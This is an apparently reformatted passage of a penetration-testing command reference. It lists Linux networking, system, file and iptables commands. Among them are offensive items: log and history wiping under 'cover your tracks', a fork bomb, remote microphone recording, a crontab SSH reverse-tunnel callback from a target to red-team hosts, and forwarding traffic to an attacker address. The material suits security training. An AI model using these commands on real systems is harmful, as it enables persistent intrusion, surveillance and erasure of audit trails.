# Book Information and Copyright Notice

This document has been modified without permission by 0E800 (March 2014). For more information, please refer to the manual. Copyright Â© 2013 by Ben Clark. All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, without prior written permission from the copyright owner.

- **ISBN-10:** 1494295504
- **ISBN-13:** 978-1494295509
- **Technical Editor:** Joe Vest
- **Graphic Design:** Joe Vest

Product and company names mentioned herein may be trademarks of their respective owners. The author uses these names in an editorial fashion with no intention of trademark infringement. The use of a term in this book should not be regarded as affecting the validity of any trademark or service mark.

The information in this book is provided "as is." While every precaution was taken to ensure the accuracy of the material, the author assumes no responsibility or liability for errors, omissions, or damages resulting from the use of the information contained herein.

## Table of Contents
- *NIX: 4
- WINDOWS: 14
- NETWORKING: 34
- TIPS AND TRICKS: 42
- TOOL SYNTAX: 50
- WEB: 66
- DATABASES: 72
- PROGRAMMING: 76
- WIRELESS: 84
- REFERENCES: 94
- INDEX: 95

### Bonus Material Added by 0E800
- Nmap Cheat Sheet
- TCP/IP INFOSEC MIND MAPS
- VLAN INFRASTRUCTURE TESTS
- Wireshark Display Filters
- VOIP PRACTICE LABS
- Common Ports List
- WLAN VM / LIVECD
- Google Cheat Sheet
- HTML BROWSER PLUGINS
- Scapy
- PHP
- WIFI
- TCPDUMP
- Python
- WEB APP
- NAT
- Regular Expressions
- ISO 27001
- QoS
- PCI DSS
- SQL Server
- IPv4
- VIRUS
- IPv6
- WORMS

## LINUX NETWORK COMMANDS
- `watch ss -tp`: Network connections
- `netstat -ant`: TCP connections
- `netstat -anu=udp`: UDP connections
- `netstat -tulpn`: Connections with PIDs
- `lsof -i`: Established connections
- `smb://ip/share`: Access Windows SMB share
- `share user x.x.x.x c$`: Mount Windows share
- `smbclient -U user\\@ip\share`: SMB connect
- `ifconfig eth# ip/cidr`: Set IP and netmask
- `ifconfig eth0:1 ip/cidr`: Set virtual interface
- `route add default gw gw_ip`: Set gateway
- `ifconfig eth# mtu [size]`: Change MTU size
- `export MAC=xx:XX:XX:XX:XX:XX`: Change MAC
- `ifconfig int hw ether MAC`: Change MAC
- `macchanger -m MAC int`: Backtrack MAC changer
- `iwlist int scan`: Built-in WiFi scanner
- `dig -x ip`: Domain lookup for IP
- `host ip`: Domain lookup for IP
- `host -t SRV service.tcp.url.com`: Domain SRV lookup
- `dig @ip domain -t AXFR`: DNS Zone Transfer
- `host -l domain nameserver`: DNS Zone Transfer
- `ip xfrm state list`: Print existing VPN keys
- `ip addr add ip/cidr dev eth0`: Adds 'hidden' interface
- `grep DHCP /var/log/messages`: List DHCP assignments
- `tcpkill host ip and port port`: Block IP:port
- `echo "1" > /proc/sys/net/ipv4/ip_forward`: Turn on IP Forwarding
- `echo "nameserver x.x.x.x" >> /etc/resolv.conf`: Add DNS server

## LINUX SYSTEM INFORMATION
- `id`: Current username
- `w`: Logged-on users
- `who -a`: User information
- `last -a`: Last users logged on
- `ps -ef`: Process listing (top)
- `df -h`: Disk usage (free)
- `uname -a`: Kernel version/CPU info
- `mount`: Mounted file systems
- `getent passwd`: Show list of users
- `PATH=$PATH:/home/mypath`: Add to PATH variable
- `kill pid`: Kills process with PID
- `cat /etc/issue`: Show OS info
- `cat /etc/release`: Show OS version info
- `cat /proc/version`: Show kernel info
- `rpm --query -all`: Installed packages (Redhat)
- `rpm -ivh .rpm`: Install RPM (-e to remove)
- `dpkg -get-selections`: Installed packages (Ubuntu)
- `dpkg -i .deb`: Install DEB (-r to remove)
- `pkginfo`: Installed packages (Solaris)
- `which tcsh/csh/ksh/bash`: Show location of executable
- `chmod -s tcsh/csh/ksh`: Disable shell, force bash

## LINUX UTILITY COMMANDS
- `wget http://url -O url.txt -o /dev/null`: Grab URL
- `rdesktop ip`: Remote Desktop to IP
- `scp /tmp/file user@x.x.x.x:/tmp/file`: Put file
- `scp user@remoteip:/tmp/file /tmp/file`: Get file
- `useradd -m user`: Add user
- `passwd user`: Change user password
- `rmuser username`: Remove user
- `script -a outfile`: Record shell (Ctrl-D stops)
- `apropos subject`: Find related command
- `history`: View user's command history
- `! num`: Executes line # in history

## LINUX FILE COMMANDS
- `diff file1 file2`: Compare files
- `rm -rf dir`: Force delete of directory
- `shred -f -u file`: Overwrite/delete file
- `touch -r ref_file file`: Matches ref_file timestamp
- `touch -t YYYYMMDDHHSS file`: Set file timestamp
- `sudo fdisk -l`: List connected drives
- `mount /dev/sda# /mnt/usbkey`: Mount USB key
- `md5sum -t file`: Compute MD5 hash
- `echo -n "str" | md5sum`: Generate MD5 hash
- `sha1sum file`: SHA1 hash of file
- `sort -u`: Sort/show unique lines
- `grep -c "str" file`: Count lines with "str"
- `tar cf file.tar files`: Create .tar from files
- `tar xf file.tar`: Extract .tar
- `tar czf file.tar.gz files`: Create .tar.gz
- `tar xzf file.tar.gz`: Extract .tar.gz
- `tar cjf file.tar.bz2 files`: Create .tar.bz2
- `tar xjf file.tar.bz2`: Extract .tar.bz2
- `gzip file`: Compress/rename file
- `gzip -d file.gz`: Decompress file.gz
- `upx -9 -o out.exe orig.exe`: UPX packs orig.exe
- `zip -r zipname.zip Directory/`: Create zip
- `dd skip=1000 count=2000 bs=5 if=file of=file`: Cut block 1K-3K from file
- `split -b 9K file prefix`: Split file into 9K chunks
- `awk 'sub("$"."\r")' unix.txt win.txt`: Win-compatible text file
- `find -i -name file -type '.pdf'`: Find PDF files
- `find -perm -4000 -o -perm -2000 -exec ls -ldb {} \;`: Search for setuid files
- `dos2unix file`: Convert to Unix format
- `file file`: Determine file type/info
- `chattr (+/-)i file`: Set/Unset immutable bit

## LINUX SHELL SCRIPTING
- `unset HISTFILE`: Disable history logging
- `ssh user@ip arecord - | aplay -`: Record remote mic
- `gcc -o outfile myfile.c`: Compile C, C++
- `init 6`: Reboot (0 = shutdown)
- `cat /etc/syslog.conf | grep -v '#'`: List of log files
- `grep 'href=' file | cut -d"/" -f3 | sort -u`: Strip links in url.com
- `dd if=/dev/urandom of=file bs=3145728 count=100`: Make random 31MB file

## LINUX COVER YOUR TRACKS COMMANDS
- `echo "" > /var/log/auth.log`: Clear auth.log file
- `echo "" > ~/.bash_history`: Clear current user bash history
- `rm ~/.bash_history -rf`: Delete .bash_history file
- `history -c`: Clear current session history
- `export HISTFILESIZE=0`: Set history max lines to 0
- `export HISTSIZE=0`: Set history max commands to 0
- `unset HISTFILE`: Disable history logging (logout to take effect)
- `kill -9 $$`: Kills current session
- `ln /dev/null ~/.bash_history -sf`: Permanently send all bash history commands to /dev/null

## LINUX FILE SYSTEM STRUCTURE
- `/bin`: User binaries
- `/boot`: Boot-up related files
- `/dev`: Interface for system devices
- `/etc`: System configuration files
- `/home`: Base directory for user files
- `/lib`: Critical software libraries
- `/opt`: Third-party software
- `/proc`: System and running programs
- `/root`: Home directory of root user
- `/sbin`: System administrator binaries
- `/tmp`: Temporary files
- `/usr`: Less critical files
- `/var`: Variable system files

## LINUX FILES
- `/etc/shadow`: Local users' hashes
- `/etc/passwd`: Local users
- `/etc/group`: Local groups
- `/etc/rc.d`: Startup services
- `/etc/init.d`: Service
- `/etc/hosts`: Known hostnames and IPs
- `/etc/HOSTNAME`: Full hostname with domain
- `/etc/network/interfaces`: Network configuration
- `/etc/profile`: System environment variables
- `/etc/apt/sources.list`: Ubuntu sources list
- `/etc/resolv.conf`: Nameserver configuration
- `/home/user/.bash_history`: Bash history (also /root/)
- `/usr/share/wireshark/manuf`: Vendor-MAC lookup
- `~/.ssh/`: SSH keystore
- `/var/log`: System log files (most Linux)
- `/var/adm`: System log files (Unix)
- `/var/spool/cron`: List cron files
- `/var/log/apache/access.log`: Apache connection log
- `/etc/fstab`: Static file system info

## LINUX SCRIPTING
- **Ping Sweep**
  ```bash
  for x in {1..254}; do ping -c 1 1.1.1.$x | grep "64 bytes" | cut -d" " -f4 >> ips.txt; done
  ```
- **Automated Domain Name Resolve Bash Script**
  ```bash
  #!/bin/bash
  echo "Enter Class C Range: i.e. 192.168.3"
  read range
  for ip in {1..254}; do
    host $range.$ip | grep "name pointer" | cut -d" " -f5
  done
  ```
- **Fork Bomb (Creates processes until system "crashes")**
  ```bash
  :() {:|:&};:
  ```
- **DNS Reverse Lookup**
  ```bash
  for ip in {1..254}; do dig -x 1.1.1.$ip | grep $ip >> dns.txt; done
  ```
- **IP Banning Script**
  ```bash
  #!/bin/sh
  # This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
  # It assumes 1 is the router and does not ban IPs .20, .21, .22
  i=2
  while [ $i -le 253 ]; do
    if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
      echo "BANNED: arp -s 192.168.1.$i"
      arp -s 192.168.1.$i 00:00:00:00:00:00
    else
      echo "IP NOT BANNED: 192.168.1.$i"
    fi
    i=$((i + 1))
  done
  ```

## SSH CALLBACK
- Set up a script in crontab to callback every X minutes. Highly recommend setting up a generic user on the red team computer (with no shell privileges). The script will use the private key (located on the callback source computer) to connect to a public key (on the red team computer). Red teamer connects to the target via a local SSH session (in the example below, use `ssh -p4040 localhost`).
  ```bash
  #!/bin/sh
  # Callback script located on callback source computer (target)
  killall ssh /dev/null 2>&1
  sleep 5
  REMLIS=4040
  REMUSR=user
  HOSTS="domain1.com domain2.com domain3.com"
  for LIVEHOST in $HOSTS; do
    COUNT=$(ping -c2 $LIVEHOST | grep 'received' | awk -F',' '{ print $2 }' | awk '{ print $1 }')
    if [ $COUNT -gt 0 ]; then
      ssh -R $REMLIS:localhost:22 -i "/home/$REMUSR/.ssh/id_rsa" -N $LIVEHOST -l $REMUSR
    fi
  done
  ```

## IPTABLES
- `iptables-save > file`: Save iptables rules to file
- `iptables-restore < file`: Restore iptables rules from file
- `iptables -L -v --line-numbers`: List all iptables rules with counters and line numbers
- `iptables -F`: Flush all iptables rules
- `iptables -P INPUT/FORWARD/OUTPUT ACCEPT/REJECT/DROP`: Change default policy for rules that don't match
- `iptables -A INPUT -i interface -m state --state RELATED,ESTABLISHED -j ACCEPT`: Allow established connections on INPUT
- `iptables -D INPUT rule_number`: Delete inbound rule
- `iptables -t raw -L -n`: Increase throughput by turning off statefulness
- `iptables -P INPUT DROP`: Drop all packets
- **Allow SSH on Port 22 Outbound**
  ```bash
  iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
  iptables -A INPUT -i iface -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
  ```
- **Allow ICMP Outbound**
  ```bash
  iptables -A OUTPUT -i iface -p icmp --icmp-type echo-request -j ACCEPT
  iptables -A INPUT -o iface -p icmp --icmp-type echo-reply -j ACCEPT
  ```
- **Port Forward**
  ```bash
  echo "1" > /proc/sys/net/ipv4/ip_forward
  OR
  sysctl net.ipv4.ip_forward=1
  iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT --to-destination attackip:443
  iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT --to-source pivotip
  iptables -t filter -I FORWARD -j ACCEPT
  ```
- **Allow Only 1.1.1.0/24, Ports 80, 443, and Log Drops to /var/log/messages**
  ```bash
  iptables -A INPUT -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW -p tcp -m multiport --dports 80,443 -j ACCEPT
  iptables -A INPUT -j LOG --log-prefix "DROP: " --log-level 4
  iptables -A INPUT -j DROP
  ```

This optimized version provides a clearer, more organized, and professional presentation of the content.